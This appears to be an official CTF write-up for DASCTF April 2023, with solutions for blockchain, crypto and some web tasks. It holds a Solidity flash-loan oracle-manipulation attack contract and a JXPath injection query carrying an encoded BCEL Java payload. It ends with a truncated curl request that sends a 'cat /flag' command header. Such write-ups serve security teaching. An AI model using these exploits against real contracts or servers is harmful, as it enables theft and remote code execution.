# 官方Write Up｜DASCTF Apr.2023 X SU战队2023开局之战

> 原文: https://www.ctfiot.com/111908.html
> ID: 111908

4月22日，DASCTF Apr.2023 X SU战队2023开局之战于BUU平台顺利开赛。

本场竞赛由国内知名战队SU操刀，在五大常规CTF题型上增加BLOCKCHAIN方向题目，赛题新颖，知识覆盖面广。特此发布官方WP供大家复盘学习～

（点击文末“阅读原文”获得完整版WP）

BLOCKCHAIN

这必不可能是预言机

1、首先观察到Challenge合约，和题目相关的合约主要有四个，分别是WETH、FlagToken、Vault、TrashOracle，且易知初始状态下金库合约中共有1000枚WETH和1000枚FLAG，它们的兑换比例为1:1。达成解出状态要求我们实现Challenge合约中的FLAG代币余额为1000 ether，也就是从金库中窃取出所有的FLAG代币并存入Challenge合约账户。

2、浏览一遍合约代码发现WETH和FLAG代币合约都是正常的，于是从另两个合约着手分析。Vault合约提供了闪电贷功能，并且提供了deposit函数供我们使用WETH代币按照预言机提供的比例兑换出FLAG代币，但是调用这个函数需要构造特殊消息签名并且通过_verifyIntention函数的验证。

3、而预言机提供的兑换比率是通过FLAG/WETH计算的。目前1 WETH只能换出1 FLAG，且由于水龙头限制了每分钟领取一次ETH，所以在有限时间内是不能硬解的，考虑使用闪电贷借出金库中的999枚WETH，这样两者的比例就变成了1000:1，这样1 WETH就能够换出1000 FLAG，将其发送至Challenge合约即可达成解出条件。

4、下面通过构造攻击合约来完成解题。首先给出攻击合约代码如下：

pragma solidity 0.8.19;

import "./Challenge.sol";

contract Hacker is IERC3156FlashBorrower {
    bytes32 internal constant _RETURN_VALUE =
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    Challenge ChallengeContract;
    WETH WETHContract;
    FlagToken FLAGContract;
    Vault VaultContract;
    TrashOracle TrashOracleContract;
    SignedIntention sintention;

    constructor(address _challengeAddress) payable {
        ChallengeContract = Challenge(_challengeAddress);
        WETHContract = ChallengeContract.WETHContract();
        FLAGContract = ChallengeContract.FLAGContract();
        VaultContract = ChallengeContract.VaultContract();
        TrashOracleContract = ChallengeContract.TrashOracleContract();
        WETHContract.deposit{value: 1 ether}();
        WETHContract.approve(address(VaultContract), type(uint256).max);
    }

    function getMessageHash(address _myAddress)
        external
        view
        returns (bytes32)
    {
        Intention memory _intention = Intention(
            _myAddress,
            address(ChallengeContract),
            1000,
            1,
            "I want to capture the flag"
        );

        bytes32 MessageHash = keccak256(
            abi.encode(
                "I am",
                _intention.issuer,
                "I want to deposit",
                _intention.amount,
                "WETH into the vault when the ratio is",
                _intention.ratio,
                "and transfer bonus to",
                _intention.to,
                "because",
                _intention.reason
            )
        );
        return MessageHash;
    }

    function hack(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        Intention memory intention = Intention(
            tx.origin,
            address(ChallengeContract),
            1000,
            1,
            "I want to capture the flag"
        );
        Signature memory signature = Signature(v, r, s);
        sintention = SignedIntention(intention, signature);
        VaultContract.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(WETHContract),
            999 ether,
            new bytes(0)
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        VaultContract.deposit(sintention);
        WETHContract.transfer(initiator, amount);
        return _RETURN_VALUE;
    }

    function test() public view returns (uint256) {
        return
            IERC20(address(FLAGContract)).balanceOf(address(ChallengeContract));
    }

    function isSolved() public view returns (bool) {
        return ChallengeContract.isSolved();
    }
}

5、攻击合约在部署时会先获取到题目相关的合约地址并存储，并将1 ETH包装为1 WETH，授权金库合约转移其所有的WETH。在getMessageHash函数中构造待签名的消息数据结构，其中intention.issuer传入自己的EOA账户地址，intention.to设为Challenge合约的地址，intention.ratio设置为1000，intention.amount设置为1，intention.reason设置为"I want to capture the flag"，这样构造后便能够通过Vault合约中_verifyIntention函数的验证，返回生成的MessageHash以便我们在链下进行签名。

6、签名后得到的v,r,s值传入hack函数构造SignedIntention结构体，并调用闪电贷函数借出999枚WETH，操纵预言机提供的兑换比率变成1000:1。

7、在闪电贷回调函数onFlashLoan中向金库存入1 WETH并得到1000 FLAG发送给Challenge合约账户，归还闪电贷，达成解出条件。

8、下面给出链上交互脚本：

from Poseidon.Blockchain import *  # https://github.com/B1ue1nWh1te/Poseidon

# 连接至链
chain = Chain("http://<ServerIP>:8545")

# 导入账户
account = Account(chain, "<PrivateKey>")

# 切换 solidity 版本
BlockchainUtils.SwitchSolidityVersion("0.8.19")

# 编译 Hacker 合约
abi, bytecode = BlockchainUtils.Compile("Hacker.sol", "Hacker")

# 部署 Hacker 合约
hacker = account.DeployContract(abi, bytecode, Web3.toWei(1, 'ether'), None, "<ChallengeAddress>")["Contract"]

# 获取待签名消息哈希
messageHash = hacker.ReadOnlyCallFunction("getMessageHash", account.EthAccount.address)

# 对消息哈希进行签名
SignatureData = account.SignMessageHash(messageHash)

# 调用 hack 函数并传入签名
hacker.CallFunction("hack", SignatureData["V"], SignatureData["R"], SignatureData["S"])

# 查看 Challenge 合约的 FLAG 余额
hacker.ReadOnlyCallFunction("test")

# 查看解出状态
hacker.ReadOnlyCallFunction("isSolved")

9、到判题程序中提交结果，得到flag。

到国链之光一游

1、访问题给链接，发现智能合约部署在 Conflux eSpace Testnet 上，并且已经开源。

2、合约代码如下，通过分析可以得知我们的目标是要触发CaptureTheFlag事件。这需要选手通过浏览器提供的水龙头提前领取该测试网的gas费，并且需要查询该网络的RPC。

pragma solidity 0.8.19;

contract SignIn {
    Greeter public greeter;
    address public owner;
    uint8 private unusal1;
    uint256[4] private unusal2;
    bytes32 private key;

    modifier onlyOwner() {
        require(tx.origin == owner);
        _;
    }

    constructor() {
        greeter = Greeter(msg.sender);
        owner = tx.origin;
        key = keccak256(abi.encodePacked(block.timestamp));
    }

    function getFlag(bytes32 _key) external onlyOwner {
        require(_key == key);
        greeter.getFlag();
    }
}

contract Greeter {
    event StartChallenge(address indexed challenge);
    event CaptureTheFlag(address indexed player);

    mapping(address => bool) SignIn_Deployed;

    modifier onlySignIn() {
        require(SignIn_Deployed[msg.sender]);
        _;
    }

    constructor() {}

    function startChallenge() external returns (address) {
        address _SignInAddress = address(new SignIn());
        SignIn_Deployed[_SignInAddress] = true;
        emit StartChallenge(_SignInAddress);
        return _SignInAddress;
    }

    function getFlag() external onlySignIn {
        SignIn_Deployed[msg.sender] = false;
        emit CaptureTheFlag(tx.origin);
    }
}

3、本题有多种解法，要想触发CaptureTheFlag事件，只能先开启挑战然后借助SignIn合约来完成，因为设置了函数调用权限。常规解法是首先调用Greeter合约的startChallenge()函数创建出专属于选手自己的SignIn合约，通过区块链浏览器查看SignIn合约的地址，然后通过外部工具读取其私有变量key的值（分析可知存储在 slot 6 ），最后调用SignIn合约的getFlag(bytes32 _key)函数触发事件，提交触发了事件的交易哈希到判题程序即可。其他解法比如直接部署攻击合约来一键预测随机数并调用上述的几个相关函数也是可以的，甚至手速够快的选手还可以守株待兔，通过区块链浏览器捕获其他已经触发了事件的交易，但是需要在128个块之内才算有效。作为一道新手友好的入门签到题目，这些情况特意允许。

4、常规解法的解题脚本如下，分为两部分：

from Poseidon.Blockchain import * # https://github.com/B1ue1nWh1te/Poseidon

# 连接至链
chain = Chain("https://evmtestnet.confluxrpc.com")

# 导入账户
account = Account(chain, "<PrivateKey>")

# 切换 solidity 版本
BlockchainUtils.SwitchSolidityVersion("0.8.19")

# 编译 Greeter 合约
abi, bytecode = BlockchainUtils.Compile("Greeter.sol", "Greeter")

# 合约实例化
contract = Contract(account, "<GreeterAddress>", abi)

# 调用 startChallenge 函数
contract.CallFunction("startChallenge")

# 以下部分的<SignInAddress>需要先通过区块链浏览器获取到合约地址并填入，这里只是为了方便展示而放在一起

# 编译 SignIn 合约
abi, bytecode = BlockchainUtils.Compile("Greeter.sol", "SignIn")

# 合约实例化
contract = Contract(account, "<SignInAddress>", abi)

# 读取存储插槽 slot 6 的值（key的值）
key = chain.GetStorage("<SignInAddress>", 6)

# 调用 getFlag 函数，触发 CaptureTheFlag 事件
contract.CallFunction("getFlag", key)

5、运行上面的脚本，在获得到已经触发事件的交易哈希后，为了进入判题程序提交还需要通过 PoW 验证，示例脚本如下：

from Poseidon.PoW import PoWUtils

Connection = PoWUtils.ProofOfWork_SHA256_EndWithZero("<ServerIP>", 20000, "sha256(", " + ???)", 3, 10, "??? = ")
Connection.interactive()

6、选项1，提交哈希，得到flag。

CRYPTO

sign1n

1、分析gift()，推导r的值 不妨设r>2，则，

，因此

不是素数，这与gift是素数矛盾，因此r=2.

2、分析签名过程easy_sign()

         ，欧拉定理化简一下就是

已知

，并且e比较小，那么到这里就可以对s乘上这部分的逆 去盲，得到

，最后用e验签即可得到flag。

from Crypto.Util.number import *

n = 17501785470905115084530641937586010443633001681612179692218171935474388105810758340844015368385708349722992595891293984847291588862799310921139505076364559140770828784719022502905431468825797666445114531707625227170492272392144861677408547696040355055483067831733807927267488677560035243230884564063878855983123740667214237638766779250729115967995715398679183680360515620300448887396447013941026492557540060990171678742387611013736894406804530109193638867704765955683067309269778890269186100476308998155078252336943147988308936856121869803970807195714727873626949774272831321358988667427984601788595656519292763705699
WHATF= 7550872408895903340469549867088737779221735042983487867888690747510707575208917229455135563614675077641314504029666714424242441219246566431788414277587183624484845351111624500646035107614221756706581150918776828118482092241867365644233950852801286481603893259029733993572417125002284605243126366683373762688802313288572798197775563793405251353957529601737375987762230223965539018597115373258092875512799931693493522478726661976059512568029782074142871019609980899851702029278565972205831732184397965899892253392769838212803823816067145737697311648549879049613081017925387808738647333178075446683195899683981412014732
sign = 12029865785359077271888851642408932941748698222400692402967271078485911077035193062225857653592806498565936667868784327397659271889359852555292426797695393591842279629975530499882434299824406229989496470187187565025826834367095435441393901750671657454855301104151016192695436071059013094114929109806658331209302942624722867961155156665675500638029626815869590842939369327466155186891537025880396861428410389552502395963071259114101340089657190695306100646728391832337848064478382298002033457224425654731106858054291015385823564302151351406917158392454536296555530524352049490745470215338669859669599380477470525863815
# 推导可得r的值
r = 2
e = 0x10001
# 去盲
tmp = sign * inverse(pow(r,WHATF - 3 + e,n),n) % n
# 验证签名
m_ = pow(tmp,e,n)
print(long_to_bytes(m_))

ECC?

1、由于已知三个密文C1，C2，C3，三个密文都在椭圆曲线上，因此可利用椭圆曲线表达式

在模kn(gift)下建立三个方程，，利用Groebner基进行化简很容易求出a和b，并且n也可以被规约出来。

2、得到a，b，n就可以恢复等效的椭圆曲线

。不难发现enc就是ECC上的群构成的RSA加密，即将明文映射为ecc上的点m，然后有

，这个数乘运算是在ecc上点的运算。现有同一个m用三组不同e加密得到的c，这可以类比rsa的共模攻击，具体地，利用拓展欧几里得算法，容易求得，经测试

等于1，那么 ，而

都已知了，全部带入即可。

from sage.all import *

e1 = 516257683822598401
e2 = 391427904712695553
e3 = 431785901506020973
gift = 10954621221812651197619957228527372749810730943802288293715079353550311138677754821746522832935330138708418986232770630995550582619687239759917418738050269898943719822278514605075330569827210725314869039623167495140328454254640051293396463956732280673238182897228775094614386379902845973838934549168736103799539422716766688822243954145073458283746306858717624769112552867126607212724068484647333634548047278790589999183913
C1 = (1206929895217993244310816423179846824808172528120308055773133254871707902120929022352908110998765937447485028662679732041, 652060368795242052052268674691241294013033011634464089331399905627588366001436638328894634036437584845563026979258880828)
C2 = (1819289899794579183151870678118089723240127083264590266958711858768481876209114055565064148870164568925012329554392844153, 1110245535005295568283994217305072930348872582935452177061131445872842458573911993488746144360725164302010081437373324551)
C3 = (1112175463080774353628562547288706975571507012326470665917118873336738873653792420189391867408691423887642725415133046354, 1820636035485820691083758790204536675748006232767111209985774382700260408550258280489088658228739971137550264759084468620)
# 根据椭圆曲线表达式构造 groebner_basis() 
P.<a,b>=PolynomialRing(Zmod(gift))
F=[]
f1 = C1[0]^3 + a*C1[0] + b - C1[1]^2 
f2 = C2[0]^3 + a*C2[0] + b - C2[1]^2
f3 = C3[0]^3 + a*C3[0] + b - C3[1]^2
F.append(f1)
F.append(f2)
F.append(f3)

Ideal = Ideal(F)
I = Ideal.groebner_basis()
print(I)
# 求解参数a b n
res=[x.constant_coefficient() for x in I]
n = res[2]
a = -res[0]%n
b = -res[1]%n
      
E=EllipticCurve(Zmod(n),[a,b])
P1=E(C1)
P2=E(C2)
P3=E(C3)
# 三个e的ECRSA共模攻击
g1,s1,t1=xgcd(e1,e2)
g2,s2,t2=xgcd(g1,e3)
assert g2 == 1
M=s2*s1*P1 + s2*t1*P2 + t2*P3
from Crypto.Util.number import *
print(long_to_bytes(int(M[0])))

babyhash_revenge

1、通过求具有大因子的卡迈克尔数通过proof_of_work卡迈克尔数的定义是对于合数n，如果对于所有与n互质的正整数b，都有同余式

成立，则称合数n为Carmichael数。所以当n的因子较大、个数较少的时候，更容易多次通过费马素性判定。那么如果能找到较大的卡迈克尔数就可能通过proof，生成方法如下：

2、LCG的hnp求解

由于hash函数用LCG的a作为密钥，所以要先求a。对于这个lcg，我们已知信息为，可以构造如下的格求解hnp规约得到a。

WEB

ezjxpath的解题思路

pdf_converter的解题思路

largeheap的解题思路

W

P

完整版链接

请师傅们点击【阅读原文】查看四月DASCTF【WP】完整版

扫码进群，了解更多DASCTF赛事资讯

往期精选

校企党建共建｜安恒信息与浙江经济职业技术学院达成战略合作

2023-04-14

安恒培训｜五月认证培训计划来袭！热门课程火热报名中～

2023-04-13

第六届西湖论剑·中国杭州网络安全技能大赛圆满收官！

2023-03-21


```
pragma solidity 0.8.19;

import "./Challenge.sol";

contract Hacker is IERC3156FlashBorrower {
    bytes32 internal constant _RETURN_VALUE =
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    Challenge ChallengeContract;
    WETH WETHContract;
    FlagToken FLAGContract;
    Vault VaultContract;
    TrashOracle TrashOracleContract;
    SignedIntention sintention;

    constructor(address _challengeAddress) payable {
        ChallengeContract = Challenge(_challengeAddress);
        WETHContract = ChallengeContract.WETHContract();
        FLAGContract = ChallengeContract.FLAGContract();
        VaultContract = ChallengeContract.VaultContract();
        TrashOracleContract = ChallengeContract.TrashOracleContract();
        WETHContract.deposit{value: 1 ether}();
        WETHContract.approve(address(VaultContract), type(uint256).max);
    }

    function getMessageHash(address _myAddress)
        external
        view
        returns (bytes32)
    {
        Intention memory _intention = Intention(
            _myAddress,
            address(ChallengeContract),
            1000,
            1,
            "I want to capture the flag"
        );

        bytes32 MessageHash = keccak256(
            abi.encode(
                "I am",
                _intention.issuer,
                "I want to deposit",
                _intention.amount,
                "WETH into the vault when the ratio is",
                _intention.ratio,
                "and transfer bonus to",
                _intention.to,
                "because",
                _intention.reason
            )
        );
        return MessageHash;
    }

    function hack(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        Intention memory intention = Intention(
            tx.origin,
            address(ChallengeContract),
            1000,
            1,
            "I want to capture the flag"
        );
        Signature memory signature = Signature(v, r, s);
        sintention = SignedIntention(intention, signature);
        VaultContract.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(WETHContract),
            999 ether,
            new bytes(0)
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        VaultContract.deposit(sintention);
        WETHContract.transfer(initiator, amount);
        return _RETURN_VALUE;
    }

    function test() public view returns (uint256) {
        return
            IERC20(address(FLAGContract)).balanceOf(address(ChallengeContract));
    }

    function isSolved() public view returns (bool) {
        return ChallengeContract.isSolved();
    }
}
```



```
from Poseidon.Blockchain import *  # https://github.com/B1ue1nWh1te/Poseidon

# 连接至链
chain = Chain("http://<ServerIP>:8545")

# 导入账户
account = Account(chain, "<PrivateKey>")

# 切换 solidity 版本
BlockchainUtils.SwitchSolidityVersion("0.8.19")

# 编译 Hacker 合约
abi, bytecode = BlockchainUtils.Compile("Hacker.sol", "Hacker")

# 部署 Hacker 合约
hacker = account.DeployContract(abi, bytecode, Web3.toWei(1, 'ether'), None, "<ChallengeAddress>")["Contract"]

# 获取待签名消息哈希
messageHash = hacker.ReadOnlyCallFunction("getMessageHash", account.EthAccount.address)

# 对消息哈希进行签名
SignatureData = account.SignMessageHash(messageHash)

# 调用 hack 函数并传入签名
hacker.CallFunction("hack", SignatureData["V"], SignatureData["R"], SignatureData["S"])

# 查看 Challenge 合约的 FLAG 余额
hacker.ReadOnlyCallFunction("test")

# 查看解出状态
hacker.ReadOnlyCallFunction("isSolved")
```



```
pragma solidity 0.8.19;

contract SignIn {
    Greeter public greeter;
    address public owner;
    uint8 private unusal1;
    uint256[4] private unusal2;
    bytes32 private key;

    modifier onlyOwner() {
        require(tx.origin == owner);
        _;
    }

    constructor() {
        greeter = Greeter(msg.sender);
        owner = tx.origin;
        key = keccak256(abi.encodePacked(block.timestamp));
    }

    function getFlag(bytes32 _key) external onlyOwner {
        require(_key == key);
        greeter.getFlag();
    }
}

contract Greeter {
    event StartChallenge(address indexed challenge);
    event CaptureTheFlag(address indexed player);

    mapping(address => bool) SignIn_Deployed;

    modifier onlySignIn() {
        require(SignIn_Deployed[msg.sender]);
        _;
    }

    constructor() {}

    function startChallenge() external returns (address) {
        address _SignInAddress = address(new SignIn());
        SignIn_Deployed[_SignInAddress] = true;
        emit StartChallenge(_SignInAddress);
        return _SignInAddress;
    }

    function getFlag() external onlySignIn {
        SignIn_Deployed[msg.sender] = false;
        emit CaptureTheFlag(tx.origin);
    }
}
```



```
from Poseidon.Blockchain import * # https://github.com/B1ue1nWh1te/Poseidon

# 连接至链
chain = Chain("https://evmtestnet.confluxrpc.com")

# 导入账户
account = Account(chain, "<PrivateKey>")

# 切换 solidity 版本
BlockchainUtils.SwitchSolidityVersion("0.8.19")

# 编译 Greeter 合约
abi, bytecode = BlockchainUtils.Compile("Greeter.sol", "Greeter")

# 合约实例化
contract = Contract(account, "<GreeterAddress>", abi)

# 调用 startChallenge 函数
contract.CallFunction("startChallenge")

# 以下部分的<SignInAddress>需要先通过区块链浏览器获取到合约地址并填入，这里只是为了方便展示而放在一起

# 编译 SignIn 合约
abi, bytecode = BlockchainUtils.Compile("Greeter.sol", "SignIn")

# 合约实例化
contract = Contract(account, "<SignInAddress>", abi)

# 读取存储插槽 slot 6 的值（key的值）
key = chain.GetStorage("<SignInAddress>", 6)

# 调用 getFlag 函数，触发 CaptureTheFlag 事件
contract.CallFunction("getFlag", key)
```



```
from Poseidon.PoW import PoWUtils

Connection = PoWUtils.ProofOfWork_SHA256_EndWithZero("<ServerIP>", 20000, "sha256(", " + ???)", 3, 10, "??? = ")
Connection.interactive()
```



```
from Crypto.Util.number import *

n = 17501785470905115084530641937586010443633001681612179692218171935474388105810758340844015368385708349722992595891293984847291588862799310921139505076364559140770828784719022502905431468825797666445114531707625227170492272392144861677408547696040355055483067831733807927267488677560035243230884564063878855983123740667214237638766779250729115967995715398679183680360515620300448887396447013941026492557540060990171678742387611013736894406804530109193638867704765955683067309269778890269186100476308998155078252336943147988308936856121869803970807195714727873626949774272831321358988667427984601788595656519292763705699
WHATF= 7550872408895903340469549867088737779221735042983487867888690747510707575208917229455135563614675077641314504029666714424242441219246566431788414277587183624484845351111624500646035107614221756706581150918776828118482092241867365644233950852801286481603893259029733993572417125002284605243126366683373762688802313288572798197775563793405251353957529601737375987762230223965539018597115373258092875512799931693493522478726661976059512568029782074142871019609980899851702029278565972205831732184397965899892253392769838212803823816067145737697311648549879049613081017925387808738647333178075446683195899683981412014732
sign = 12029865785359077271888851642408932941748698222400692402967271078485911077035193062225857653592806498565936667868784327397659271889359852555292426797695393591842279629975530499882434299824406229989496470187187565025826834367095435441393901750671657454855301104151016192695436071059013094114929109806658331209302942624722867961155156665675500638029626815869590842939369327466155186891537025880396861428410389552502395963071259114101340089657190695306100646728391832337848064478382298002033457224425654731106858054291015385823564302151351406917158392454536296555530524352049490745470215338669859669599380477470525863815
# 推导可得r的值
r = 2
e = 0x10001
# 去盲
tmp = sign * inverse(pow(r,WHATF - 3 + e,n),n) % n
# 验证签名
m_ = pow(tmp,e,n)
print(long_to_bytes(m_))
```



```
from sage.all import *

e1 = 516257683822598401
e2 = 391427904712695553
e3 = 431785901506020973
gift = 10954621221812651197619957228527372749810730943802288293715079353550311138677754821746522832935330138708418986232770630995550582619687239759917418738050269898943719822278514605075330569827210725314869039623167495140328454254640051293396463956732280673238182897228775094614386379902845973838934549168736103799539422716766688822243954145073458283746306858717624769112552867126607212724068484647333634548047278790589999183913
C1 = (1206929895217993244310816423179846824808172528120308055773133254871707902120929022352908110998765937447485028662679732041, 652060368795242052052268674691241294013033011634464089331399905627588366001436638328894634036437584845563026979258880828)
C2 = (1819289899794579183151870678118089723240127083264590266958711858768481876209114055565064148870164568925012329554392844153, 1110245535005295568283994217305072930348872582935452177061131445872842458573911993488746144360725164302010081437373324551)
C3 = (1112175463080774353628562547288706975571507012326470665917118873336738873653792420189391867408691423887642725415133046354, 1820636035485820691083758790204536675748006232767111209985774382700260408550258280489088658228739971137550264759084468620)
# 根据椭圆曲线表达式构造 groebner_basis() 
P.<a,b>=PolynomialRing(Zmod(gift))
F=[]
f1 = C1[0]^3 + a*C1[0] + b - C1[1]^2 
f2 = C2[0]^3 + a*C2[0] + b - C2[1]^2
f3 = C3[0]^3 + a*C3[0] + b - C3[1]^2
F.append(f1)
F.append(f2)
F.append(f3)

Ideal = Ideal(F)
I = Ideal.groebner_basis()
print(I)
# 求解参数a b n
res=[x.constant_coefficient() for x in I]
n = res[2]
a = -res[0]%n
b = -res[1]%n
      
E=EllipticCurve(Zmod(n),[a,b])
P1=E(C1)
P2=E(C2)
P3=E(C3)
# 三个e的ECRSA共模攻击
g1,s1,t1=xgcd(e1,e2)
g2,s2,t2=xgcd(g1,e3)
assert g2 == 1
M=s2*s1*P1 + s2*t1*P2 + t2*P3
from Crypto.Util.number import *
print(long_to_bytes(int(M[0])))
```



```
s1=''
s2=''
for i in range(len(L[:-1])):
    for j in range(40,126):
        if 40<(j+L[i])<126:
            s1+=chr(j)
            s2+=chr(j+L[i])
            break

h1 = ''
h2 = ''
c1 = 0
c2 = 0
for i in range(len(key)):
    if key[i] == '1':
        h1 = h1 + s1[c1]
        h2 = h2 + s2[c1]
        c1 += 1
    else:
        h1 = h1 + '*'
        h2 = h2 + '*'
print(h1)
print(h2)
```



```
query=runMain(com.sun.org.apache.bcel.internal.util.JavaWrapper.new(),"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$c9w$d3F$Y$ffMb$5b$b2$y$g$e2$E$82$d8w$9c$40$ecR$ba$40$C$94$90$Q$a08$81b$m$85P$40Q$86D$c4$96$8c$q$t$a1$fbBw$ba$aft$a1$x$a5$eb$a1$X$c3$83G$l$e7$k$fb$5e$P$fd$T$faz$e8$b5$87$3e$dao$q$9b$d8$c4$b4$f5a4$f3$ad$bf$f9$b6$f1O$d7$_$ff$I$e0N$7c$af$m$8a$fd$K$O$60$40$y$P$c88$a8$e0$Q$Ge$i$96$f0$a0$C$JG$q$iUp$M$ba$8c$n$Z$86$8ca$Z$5cF$b7$e0$j$971$o$a3G$c2$a8$900e$f4$ca8$a1$60$MY$FM$c8$c9$b0$c4$d7$96$91$97qRl$j$Z$ae$MOFA$c6$b8p$3d$ncR$c2$v$F$P$e1a$b1$3c$a2$e0Q$3c$a6$609$k$97$f1$84$f8$3e$v$96$a7d$3c$z$e3$b4$84g$Y$o$hM$cb$f463$d4$tZ$P0$84$ba$eda$ce$d0$906$z$de_$c8$Nqg$9f$3e$94$rJ$3cm$hz$f6$80$ee$98$e2$5c$o$86$bcQ$d3ehL$Pq$p$9b$ca$e4$j$d3$g$d96nf$3b$Z$c2Gs$bai1$ccN$M$a6O$e8$e3z$w$ab$5b$p$a9$8c$tD$3a$7dO$ba32$ce$d0T$83$cd$c0$Mau$8a$d1$9d$d5$5dW$d0s$Ms$x$e8$O$3f$9e$e5$86$97$ea$e3$de$a8$3d$y$El$BuJ$60$f7$d0$J$e2$T$a3$$$b7$96$7c$3a$dc$cd$d3U$j$7e$92$n$3a$c2$bd$B$c7$f4$b8$T$ecwp$7dX$ec$p$T$rb$bd$91$h$ae$b6v$D$9fl$d8$b9$9cn$N$d3$e5c$c6$a8$ee$b8$dc$eb$d7s$U$91$Z$ZO7$c6$fa$f4$bc$l$n$J$h$u$ef$S$9e$a5$acSZ$Z$94m$93$G$cf$7b$a6m$b9$S$9ec$98$Z$A$df$a3$3b$a4MN$c9$9e$92$b1$L$8e$c1$7bM$R$e0$86$a9$98$s$F$M$V$v$dc$$$e1y$V$_$e0E$V$_$e1$M$c3F$db$ZI$ba$be$dcqaf$c2v$c6$92$T$7c$ui$d8$96$c7$t$bd$q$dd$b6$c0$5d$_$b97$f8v$H$e4$jv$96$ae$x$e1e$V$af$e0U$86f$KAI$a2$cb$a3$7b$O$V$3cNp$gnJ$82$8a$d7$f0$3a$B$bf9$c4tI$Vo$e0M$86$z$ff$XO$86$3b$e3$d9$9aNc$3e$W7Oa$a2$m$uS$c8$Y$W$I$c7$93I7$d0$9d$b2$R$I$abxK$a0$5bQ$z4$eay$f9$e4$OZ$aa$3dV$dd$oH$ad$8a$b7$f1$O$83d$bbI$8b$a0KxW$c5$7b8$ab$e2$7d$7c$m$w$c3$b4$86$ed$J$V$l$e2$p$w$8f$ed$5bwQ$9d$ef$df$d7$db$be$5e$c59$nP$3f$b0$b3$9fJ$zE$d5$x$a5$86L$x$e5R$ce$eb$da$N$V$l$e3$T$a2$89$a0xY$ea$8aF$dfq$c13$a9k$M$dd$b2D$o$3eU$f1$Z$3eW$f1$F$ceK$f8R$c5$F$7c$r$d2$fd5Y8$dc$a5$e2$h$7c$ab$e2$3b$e1$r$7c$3c$5b$Q$86$c3F$d6$W$f1i$b8$a9$fb$Y$e6$dc$aaC$a8$df$a6X7j$b1$w$Q$fbF$jj$E$aad$a3$e08$dc$f2$ca$e7$e6Dk$faf$v$ea$84Y$94$9cRE$f9$f5$91$b6$83$$$d2$aa$c4$xXB$a7$s$83$ba0K$h$9fB$vL$d4$Y$h5$s$82$e8$dc$f2$dd$b6$d4$d0$Z$9c$a6$d3$fao$f3$pbZ$e3$f6$Y$FuCb$fa$U$Z$9cNj$ad5k$g$JS$P$e5Dw$f8p$Z$db$M$g$R$5d$86$c1$5d$d7$MFg$e2$90$98$82$95$Vx$ca$f5x$$$u$fe$3d$8e$9d$e7$8ew$8aa$e5$7f$c4$e1$c6H$8ayv$da$9e$e0N$b7$$j$a2$3a$5b$95s$cb$f2h$$S$80$e7U$g$ee$a6$Z$96$R$5da$Z$bc$b3$f5$90om$7f$3e_$b6$s$8b$q$Hyi$9a$9e$d7$cer$3d$fb$a4$bd$F$cb3s$e5$b6$z$lfU$a9$95$c8$a4$Y$e2$93$9c$ba$rQ$f3$95$a8$mQ$40D$ec$aa$5d$95$88$M$b7$91$ab$9dV$be$e0$91$s$d7$v$86$zew$a6$9d$aa$60$90z$5b$a2$s$a3$f6$h$a5$W$5c$de$c3$b3f$$x$QV$dd$3a$X$95$ad$y$aeeQ$3f$60$J$92$f4$u$8b_$j$98$98$dc$b4$ae$a5S$8a$be$8c$be$e1$b6$8b$60$3f$f8$ec$3bh$8d$f8D$V$eb$fc$d5$X$a0$ff$Uw$d17$8a$bbq$P$ea$85r$dd$V$3a$cd$A$d8$c4$r$d4$VQ$l$P$V$RN$af$8eG$ea$afB$wB$ee$5b$c3h$X$zB$e9$_$J$c4$C$B$b5$y$b0$3a$3e$a3$b4$ed$I$adi$_$Jw$84$b5$d0$8d$7d$a4$a4y$hi$c6$h$C$e1$99$jR$89$da$u$a8$f1$QQ$P$d6$c7$9b2$82$rk2$c1h$d6$a4$60$d5$c2eKQM$d6$o$q$g$r$d1Y$q$aa$5cCS$87$S$b9Jk$y$3e$fb$SZ$8a$98$T$d7$8a$98$7b$Wr$7c$de$F2$3c$bfC$z1$W$c4$X$fa$8c$b8$W$T$caZ$y$U_$94$b9$80$Gq$5c$ec$l$97$d0$g$d6$94$8cF$be$96$c6$97UB$d2$a2$81$d7$xX$7e$f0$SVh$U$84$95E$ac$d2$d4$8bH$c4$5b$8bh$xb$b5$c03$Q$e8$ae$v$5dR$8b$96$90$97$e8$ed$d3$e8$o$5d$f5$7e$baN$60$$$adqJU$TZ$d0L$d9$9e$85v$cc$c6z$3a$f5$60$OvC$c3$m$c9$9c$c4$3c$9c$c1$7cz$i$X$d0$5b$b2$Q$e7$b1$I$97I$fa$g$96$e2W$y$c3o$f4$8f$ec$P$ac$c0$9fX$85$ebH$b0$Q$da$98$82$d5$ac$Xk$d8$R$b4$b3q$aa$oQ$S$a7$83$b4$93$fd$N$a2$40$d8$Y$3a$d0Ie$d2$c2$8ea$p6Q$R$za$H$b0$Z$f7$S$be$k$b6$O$5b$88$W$c2n$96$40$X$d1$c2$Yd$f3$b1$95v$R$9cd$Rt$TW$o$5c$bf$T$d6M$90$J$d5$cf$d8F$dc$ua$bb$8a$5el$87B$I$_b$Hy$8b$R$ces$d8I4$V$f7$91$ef$f5$I$fd$8d_$a0J$d8$r$n$z$a1OB$7fy$N6$c1$7e7$J$A$5d$b4$f9$L$8bi$8da$Pi$87$I$f3$fd$d8$x$ca$9b$91$v$ba$T2$7e$P$ec$fb$H$5e$c7$8a$9fH$L$A$A",'')
```



```
curl -i -s -k -X $'POST' 
    -H $'Host: 127.0.0.1:8080' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 6096' -H $'cmd: cat /flag' 
